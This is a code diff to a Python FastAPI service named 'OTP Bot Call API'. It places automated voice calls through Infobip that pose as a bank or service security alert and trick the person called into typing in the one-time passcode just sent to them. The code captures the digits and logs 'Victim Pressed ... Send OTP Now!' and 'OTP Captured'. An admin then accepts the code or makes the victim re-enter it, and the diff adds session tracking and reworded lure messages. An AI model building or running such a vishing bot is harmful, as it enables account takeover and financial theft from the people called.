@@ -55,8 +55,9 @@ app = FastAPI(title="OTP Bot Call API", version="2.0.0")
 # Create Socket.IO ASGI app
 socket_app = socketio.ASGIApp(sio, app)
 
-# Store active sessions
+# Store active sessions - key is call_id for faster lookup
 active_sessions: Dict[str, Dict[str, Any]] = {}
+call_to_session: Dict[str, str] = {}  # call_id -> session_id mapping
 
 # Create routers
 api_router = APIRouter(prefix="/api")
@@ -96,11 +97,11 @@ class OTPCallConfig(BaseModel):
     language: str = Field(default="en", description="Language code")
     
     step1_message: str = Field(
-        default="Hello {name}, we have detected a login attempt to your {service} account from a new device. If you did not recognize this request, please press 1. If this was you, press 0.",
+        default="Hello {name}, we have detected a login attempt to your {service} account from a new device or location. If you did not recognize this request, please press 1. If this was you, press 0 to approve.",
         description="Step 1 greeting message"
     )
     step2_message: str = Field(
-        default="Alright, we just sent a {digits} digit verification code to your number. Could you please enter it using your dial pad?",
+        default="Alright, we just sent a {digits} digit verification code to your number. If you received it, could you please enter it using your dial pad?",
         description="Step 2 OTP request message"
     )
     step3_message: str = Field(
@@ -108,37 +109,13 @@ class OTPCallConfig(BaseModel):
         description="Step 3 verification message"
     )
     accepted_message: str = Field(
-        default="Okay! We have declined the sign-in request, and your account is safe. Thank you for your time. Have a nice day!",
+        default="Okay! We've declined the sign-in request, and your account is safe. Thanks for your time. Have a nice day!",
         description="Accepted/End message"
     )
     rejected_message: str = Field(
-        default="I am sorry, but the code you entered is incorrect. Could you please enter it again?",
+        default="I'm sorry, but the code you entered is incorrect. Could you please enter it again?",
         description="Rejected/Retry message"
     )
-
-class CallRecord(BaseModel):
-    model_config = ConfigDict(extra="ignore")
-    id: str
-    user_id: str
-    phone_number: str
-    caller_id: str
-    message_text: str
-    language: str
-    speech_rate: float
-    status: str
-    infobip_message_id: Optional[str] = None
-    created_at: str
-    completed_at: Optional[str] = None
-    duration_seconds: Optional[int] = None
-    error_message: Optional[str] = None
-
-class CallStats(BaseModel):
-    total_calls: int
-    completed_calls: int
-    failed_calls: int
-    pending_calls: int
-    total_duration: int
-    avg_duration: float
 
 # ==================== AUTH HELPERS ====================
 
@@ -206,6 +183,7 @@ async def emit_log(session_id: str, log_type: str, message: str, data: dict = No
     
     # Emit to connected clients
     await sio.emit('call_log', log_entry, room=session_id)
+    await sio.emit('session_update', {"session_id": session_id, "log": log_entry})
     logger.info(f"[{session_id}] {log_type}: {message}")
 
 # ==================== INFOBIP CALLS API HELPERS ====================
@@ -235,9 +213,13 @@ async def infobip_request(method: str, path: str, data: dict = None) -> dict:
             raise ValueError(f"Unsupported method: {method}")
         
         logger.info(f"Infobip {method} {path}: {response.status_code}")
-        logger.info(f"Response: {response.text[:500]}")
         
-        return {"status_code": response.status_code, "data": response.json() if response.text else {}}
+        try:
+            resp_data = response.json() if response.text else {}
+        except:
+            resp_data = {"raw": response.text}
+            
+        return {"status_code": response.status_code, "data": resp_data}
 
 async def create_outbound_call(to_number: str, from_number: str) -> dict:
     """Create outbound call using Calls API"""
@@ -250,48 +232,33 @@ async def create_outbound_call(to_number: str, from_number: str) -> dict:
         "callsConfigurationId": INFOBIP_CALLS_CONFIG_ID
     }
     
-    result = await infobip_request("POST", "/calls/1/calls", payload)
-    return result
+    return await infobip_request("POST", "/calls/1/calls", payload)
 
-async def play_tts_on_call(call_id: str, text: str, language: str = "en"):
+async def play_tts(call_id: str, text: str, language: str = "en"):
     """Play TTS on active call"""
     payload = {
         "text": text,
         "language": language
     }
-    
-    result = await infobip_request("POST", f"/calls/1/calls/{call_id}/say", payload)
-    return result
+    logger.info(f"Playing TTS on {call_id}: {text[:50]}...")
+    return await infobip_request("POST", f"/calls/1/calls/{call_id}/say", payload)
 
-async def collect_dtmf_on_call(call_id: str, max_length: int, timeout: int = 30):
-    """Collect DTMF digits from caller"""
+async def start_dtmf_capture(call_id: str, max_length: int, timeout: int = 30):
+    """Start capturing DTMF digits"""
     payload = {
         "maxLength": max_length,
         "timeout": timeout
     }
-    
-    result = await infobip_request("POST", f"/calls/1/calls/{call_id}/capture/dtmf", payload)
-    return result
+    logger.info(f"Starting DTMF capture on {call_id}, max_length={max_length}")
+    return await infobip_request("POST", f"/calls/1/calls/{call_id}/capture/dtmf", payload)
 
-async def play_and_collect(call_id: str, text: str, max_length: int, language: str = "en", timeout: int = 30):
-    """Play TTS then collect DTMF (separate calls)"""
-    # First play TTS
-    play_result = await play_tts_on_call(call_id, text, language)
-    logger.info(f"Play TTS result: {play_result}")
-    
-    # Wait for TTS to finish (approximate)
-    await asyncio.sleep(3)
-    
-    # Then collect DTMF
-    collect_result = await collect_dtmf_on_call(call_id, max_length, timeout)
-    logger.info(f"Collect DTMF result: {collect_result}")
-    
-    return collect_result
+async def stop_dtmf_capture(call_id: str):
+    """Stop capturing DTMF"""
+    return await infobip_request("POST", f"/calls/1/calls/{call_id}/capture/dtmf/stop", {})
 
 async def hangup_call(call_id: str):
     """Hangup the call"""
-    result = await infobip_request("POST", f"/calls/1/calls/{call_id}/hangup", {})
-    return result
+    return await infobip_request("POST", f"/calls/1/calls/{call_id}/hangup", {})
 
 # ==================== AUTH ROUTES ====================
 
@@ -342,11 +309,11 @@ async def get_me(current_user: dict = Depends(get_current_user)):
         created_at=current_user["created_at"]
     )
 
-# ==================== OTP BOT ROUTES WITH CALLS API ====================
+# ==================== OTP BOT ROUTES ====================
 
 @otp_router.post("/initiate-call")
 async def initiate_otp_call(config: OTPCallConfig, current_user: dict = Depends(get_current_user)):
-    """Initiate an OTP bot call with IVR"""
+    """Initiate an OTP bot call"""
     
     session_id = str(uuid.uuid4())
     now = datetime.now(timezone.utc).isoformat()
@@ -371,6 +338,7 @@ async def initiate_otp_call(config: OTPCallConfig, current_user: dict = Depends(
         "call_id": None,
         "first_input": None,
         "otp_received": None,
+        "otp_digits_collected": "",
         "created_at": now,
         "logs": [],
         "messages": {
@@ -383,10 +351,9 @@ async def initiate_otp_call(config: OTPCallConfig, current_user: dict = Depends(
     }
     
     await db.otp_sessions.insert_one(session_doc)
-    active_sessions[session_id] = session_doc
     
-    await emit_log(session_id, "info", "🤖 OTP Bot initialized")
-    await emit_log(session_id, "call", f"🚦 Initiating call to {config.recipient_number}")
+    await emit_log(session_id, "info", "🤖 Generating AI voices...")
+    await emit_log(session_id, "call", f"🚦 Call initiated")
     
     try:
         # Create outbound call
@@ -396,14 +363,16 @@ async def initiate_otp_call(config: OTPCallConfig, current_user: dict = Depends(
             call_data = result["data"]
             call_id = call_data.get("id")
             
+            # Store mappings
+            call_to_session[call_id] = session_id
+            active_sessions[session_id] = {**session_doc, "call_id": call_id}
+            
             await db.otp_sessions.update_one(
                 {"id": session_id},
                 {"$set": {"call_id": call_id, "status": "calling"}}
             )
-            active_sessions[session_id]["call_id"] = call_id
             
-            await emit_log(session_id, "success", f"📲 Call created - ID: {call_id[:8]}...")
-            await emit_log(session_id, "info", "📞 Ringing...")
+            await emit_log(session_id, "info", f"📞 Calling...")
             
             return {
                 "session_id": session_id,
@@ -421,49 +390,73 @@ async def initiate_otp_call(config: OTPCallConfig, current_user: dict = Depends(
 
 @otp_router.post("/webhook/call-events")
 async def handle_call_events(request: Request):
-    """Handle Infobip call events webhook"""
+    """Handle all Infobip call events"""
     try:
         body = await request.json()
-        logger.info(f"📞 Call event webhook: {json.dumps(body, indent=2)}")
+        logger.info(f"📞 Webhook received: {json.dumps(body, indent=2)}")
         
         call_id = body.get("callId") or body.get("id")
-        event_type = body.get("type") or body.get("state")
+        event_type = body.get("type", "UNKNOWN")
         
-        # Find session by call_id
-        session = await db.otp_sessions.find_one({"call_id": call_id}, {"_id": 0})
-        if not session:
-            logger.warning(f"No session found for call {call_id}")
+        # Find session
+        session_id = call_to_session.get(call_id)
+        if not session_id:
+            # Try from database
+            session = await db.otp_sessions.find_one({"call_id": call_id}, {"_id": 0})
+            if session:
+                session_id = session["id"]
+                call_to_session[call_id] = session_id
+                active_sessions[session_id] = session
+        
+        if not session_id:
+            logger.warning(f"No session for call {call_id}")
             return {"status": "no_session"}
         
-        session_id = session["id"]
+        session = active_sessions.get(session_id) or await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
+        if not session:
+            return {"status": "session_not_found"}
         
-        # Handle different event types
-        if event_type in ["CALL_ESTABLISHED", "ESTABLISHED"]:
-            await emit_log(session_id, "success", "✅ Call answered!")
+        # Update active session
+        active_sessions[session_id] = session
+        
+        # Handle events
+        if event_type == "CALL_RINGING":
+            await emit_log(session_id, "info", "📱 Ringing...")
+            
+        elif event_type == "CALL_ESTABLISHED":
+            await emit_log(session_id, "success", "✅ Call Answered")
+            
+            # Update status
             await db.otp_sessions.update_one(
                 {"id": session_id},
                 {"$set": {"status": "step1", "current_step": 1}}
             )
+            active_sessions[session_id]["current_step"] = 1
+            active_sessions[session_id]["status"] = "step1"
             
-            # Play Step 1 and collect 1 digit
-            await emit_log(session_id, "step", "🎙️ Playing Step 1: Greeting message")
+            # Play Step 1 greeting
+            await emit_log(session_id, "step", "🎙️ Playing Step 1 message...")
             step1_text = session["messages"]["step1"]
-            await play_and_collect(call_id, step1_text, max_length=1, language=session.get("language", "en"))
+            await play_tts(call_id, step1_text, session.get("language", "en"))
             
-        elif event_type == "CALL_RINGING":
-            await emit_log(session_id, "info", "📞 Ringing...")
+            # Start capturing 1 digit for choice
+            await asyncio.sleep(8)  # Wait for TTS to finish
+            await start_dtmf_capture(call_id, max_length=1, timeout=30)
             
-        elif event_type in ["CALL_FINISHED", "FINISHED"]:
+        elif event_type == "CALL_FINISHED":
             reason = body.get("errorCode", {}).get("name", "completed")
             await emit_log(session_id, "info", f"📴 Call ended: {reason}")
             await db.otp_sessions.update_one(
                 {"id": session_id},
                 {"$set": {"status": "completed"}}
             )
+            # Cleanup
+            if call_id in call_to_session:
+                del call_to_session[call_id]
             if session_id in active_sessions:
                 del active_sessions[session_id]
                 
-        elif event_type in ["CALL_FAILED", "FAILED"]:
+        elif event_type == "CALL_FAILED":
             error = body.get("errorCode", {}).get("description", "Unknown")
             await emit_log(session_id, "error", f"❌ Call failed: {error}")
             await db.otp_sessions.update_one(
@@ -472,60 +465,81 @@ async def handle_call_events(request: Request):
             )
             
         elif event_type == "SAY_FINISHED":
-            await emit_log(session_id, "info", "🔊 Message played")
+            logger.info(f"TTS finished on {call_id}")
             
-        elif event_type == "DTMF":
-            dtmf_value = body.get("dtmf") or body.get("value", "")
-            await handle_dtmf_input(session_id, session, call_id, dtmf_value)
+        elif event_type == "DTMF_CAPTURED":
+            dtmf_value = body.get("dtmf", "")
+            await handle_dtmf(session_id, session, call_id, dtmf_value)
+            
+        elif event_type == "CAPTURE_FINISHED":
+            # DTMF capture timeout or finished
+            dtmf_value = body.get("dtmf", "")
+            if dtmf_value:
+                await handle_dtmf(session_id, session, call_id, dtmf_value)
         
         return {"status": "processed"}
         
     except Exception as e:
-        logger.error(f"Webhook error: {e}")
+        logger.error(f"Webhook error: {e}", exc_info=True)
         return {"status": "error", "message": str(e)}
 
-async def handle_dtmf_input(session_id: str, session: dict, call_id: str, dtmf_value: str):
-    """Handle DTMF input from call"""
+async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: str):
+    """Handle DTMF input based on current step"""
     current_step = session.get("current_step", 1)
     otp_digits = session.get("otp_digits", 6)
     
-    await emit_log(session_id, "dtmf", f"🔢 DTMF received: {dtmf_value}")
+    logger.info(f"DTMF received: {dtmf_value}, current_step: {current_step}")
     
     if current_step == 1:
-        # First input (1 or 0)
-        await emit_log(session_id, "info", f"👆 Target pressed: {dtmf_value}")
+        # Step 1: User pressed 1 or 0
+        await emit_log(session_id, "warning", f"⚠️ Victim Pressed {dtmf_value} Send OTP Now!")
         
+        # Update to step 2
         await db.otp_sessions.update_one(
             {"id": session_id},
-            {"$set": {"first_input": dtmf_value, "current_step": 2, "status": "step2"}}
+            {"$set": {"first_input": dtmf_value, "current_step": 2, "status": "step2", "otp_digits_collected": ""}}
         )
+        active_sessions[session_id]["current_step"] = 2
+        active_sessions[session_id]["status"] = "step2"
+        active_sessions[session_id]["otp_digits_collected"] = ""
         
-        # Play Step 2 and collect OTP digits
-        await emit_log(session_id, "step", "🎙️ Playing Step 2: OTP request")
+        # Play Step 2 - OTP request
+        await emit_log(session_id, "step", "🎙️ Playing Step 2: OTP Request...")
         step2_text = session["messages"]["step2"]
-        await play_and_collect(call_id, step2_text, max_length=otp_digits, language=session.get("language", "en"), timeout=60)
+        await play_tts(call_id, step2_text, session.get("language", "en"))
+        
+        # Wait for TTS then capture OTP
+        await asyncio.sleep(6)
+        await start_dtmf_capture(call_id, max_length=otp_digits, timeout=60)
         
     elif current_step == 2:
-        # OTP digits received
+        # Step 2: Collecting OTP digits
         otp_code = dtmf_value.replace("#", "").replace("*", "")
         
-        await emit_log(session_id, "otp", f"🕵️ OTP submitted: {otp_code}", {"otp": otp_code})
+        if len(otp_code) >= otp_digits:
+            otp_code = otp_code[:otp_digits]
         
-        # Play Step 3
-        await emit_log(session_id, "step", "🎙️ Playing Step 3: Verification wait")
-        step3_text = session["messages"]["step3"]
-        await play_tts_on_call(call_id, step3_text, session.get("language", "en"))
+        await emit_log(session_id, "otp", f"🔑 OTP Captured: {otp_code}", {"otp": otp_code})
         
+        # Update to step 3
         await db.otp_sessions.update_one(
             {"id": session_id},
             {"$set": {"otp_received": otp_code, "current_step": 3, "status": "waiting_approval"}}
         )
+        active_sessions[session_id]["current_step"] = 3
+        active_sessions[session_id]["status"] = "waiting_approval"
+        active_sessions[session_id]["otp_received"] = otp_code
+        
+        # Play Step 3 - Verification wait
+        await emit_log(session_id, "step", "🎙️ Playing Step 3: Verification Wait...")
+        step3_text = session["messages"]["step3"]
+        await play_tts(call_id, step3_text, session.get("language", "en"))
         
         await emit_log(session_id, "action", "⏳ Waiting for admin approval...")
 
 @otp_router.post("/accept/{session_id}")
 async def accept_otp(session_id: str, current_user: dict = Depends(get_current_user)):
-    """Admin accepts the OTP"""
+    """Admin accepts the OTP - play accepted message"""
     session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
     if not session:
         raise HTTPException(status_code=404, detail="Session not found")
@@ -535,14 +549,14 @@ async def accept_otp(session_id: str, current_user: dict = Depends(get_current_u
         raise HTTPException(status_code=400, detail="No active call")
     
     await emit_log(session_id, "action", "✅ Admin pressed ACCEPT")
-    await emit_log(session_id, "step", "🎙️ Playing Accepted message")
     
     # Play accepted message
     accepted_text = session["messages"]["accepted"]
-    await play_tts_on_call(call_id, accepted_text, session.get("language", "en"))
+    await emit_log(session_id, "step", "🎙️ Playing Accepted message...")
+    await play_tts(call_id, accepted_text, session.get("language", "en"))
     
-    # Wait a bit then hangup
-    await asyncio.sleep(5)
+    # Wait then hangup
+    await asyncio.sleep(6)
     await hangup_call(call_id)
     
     await emit_log(session_id, "success", "📴 Call completed successfully")
@@ -556,7 +570,7 @@ async def accept_otp(session_id: str, current_user: dict = Depends(get_current_u
 
 @otp_router.post("/reject/{session_id}")
 async def reject_otp(session_id: str, current_user: dict = Depends(get_current_user)):
-    """Admin rejects the OTP - retry"""
+    """Admin rejects the OTP - play retry message"""
     session = await db.otp_sessions.find_one({"id": session_id}, {"_id": 0})
     if not session:
         raise HTTPException(status_code=404, detail="Session not found")
@@ -565,20 +579,27 @@ async def reject_otp(session_id: str, current_user: dict = Depends(get_current_u
     if not call_id:
         raise HTTPException(status_code=400, detail="No active call")
     
-    await emit_log(session_id, "action", "❌ Admin pressed REJECT")
-    await emit_log(session_id, "step", "🎙️ Playing Retry message")
-    
-    # Play rejected message and collect again
-    rejected_text = session["messages"]["rejected"]
     otp_digits = session.get("otp_digits", 6)
-    await play_and_collect(call_id, rejected_text, max_length=otp_digits, language=session.get("language", "en"), timeout=60)
     
-    await emit_log(session_id, "info", "🔄 Waiting for new OTP input...")
+    await emit_log(session_id, "action", "❌ Admin pressed REJECT")
     
+    # Play rejected message
+    rejected_text = session["messages"]["rejected"]
+    await emit_log(session_id, "step", "🎙️ Playing Retry message...")
+    await play_tts(call_id, rejected_text, session.get("language", "en"))
+    
+    # Update back to step 2
     await db.otp_sessions.update_one(
         {"id": session_id},
         {"$set": {"status": "step2", "current_step": 2, "otp_received": None}}
     )
+    active_sessions[session_id] = {**session, "current_step": 2, "status": "step2", "otp_received": None}
+    
+    # Wait for TTS then capture new OTP
+    await asyncio.sleep(5)
+    await start_dtmf_capture(call_id, max_length=otp_digits, timeout=60)
+    
+    await emit_log(session_id, "info", "🔄 Waiting for new OTP input...")
     
     return {"status": "rejected"}
 
@@ -616,7 +637,7 @@ async def get_otp_sessions(current_user: dict = Depends(get_current_user)):
     ).sort("created_at", -1).limit(50).to_list(50)
     return sessions
 
-# ==================== VOICE ROUTES (Simple TTS) ====================
+# ==================== VOICE ROUTES ====================
 
 @voice_router.get("/history")
 async def get_call_history(limit: int = 50, skip: int = 0, current_user: dict = Depends(get_current_user)):
@@ -625,6 +646,7 @@ async def get_call_history(limit: int = 50, skip: int = 0, current_user: dict = 
 
 @voice_router.get("/stats")
 async def get_call_stats(current_user: dict = Depends(get_current_user)):
+    # Count OTP sessions as calls
     pipeline = [
         {"$match": {"user_id": current_user["id"]}},
         {"$group": {
@@ -632,23 +654,21 @@ async def get_call_stats(current_user: dict = Depends(get_current_user)):
             "total_calls": {"$sum": 1},
             "completed_calls": {"$sum": {"$cond": [{"$eq": ["$status", "completed"]}, 1, 0]}},
             "failed_calls": {"$sum": {"$cond": [{"$eq": ["$status", "failed"]}, 1, 0]}},
-            "pending_calls": {"$sum": {"$cond": [{"$in": ["$status", ["pending", "initiated"]]}, 1, 0]}},
-            "total_duration": {"$sum": {"$ifNull": ["$duration_seconds", 0]}}
+            "pending_calls": {"$sum": {"$cond": [{"$in": ["$status", ["calling", "step1", "step2", "waiting_approval"]]}, 1, 0]}}
         }}
     ]
     
-    result = await db.calls.aggregate(pipeline).to_list(1)
+    result = await db.otp_sessions.aggregate(pipeline).to_list(1)
     
     if result:
         stats = result[0]
-        avg_duration = stats["total_duration"] / stats["completed_calls"] if stats["completed_calls"] > 0 else 0
         return {
             "total_calls": stats["total_calls"],
             "completed_calls": stats["completed_calls"],
             "failed_calls": stats["failed_calls"],
             "pending_calls": stats["pending_calls"],
-            "total_duration": stats["total_duration"],
-            "avg_duration": round(avg_duration, 2)
+            "total_duration": 0,
+            "avg_duration": 0
         }
     
     return {"total_calls": 0, "completed_calls": 0, "failed_calls": 0, "pending_calls": 0, "total_duration": 0, "avg_duration": 0}
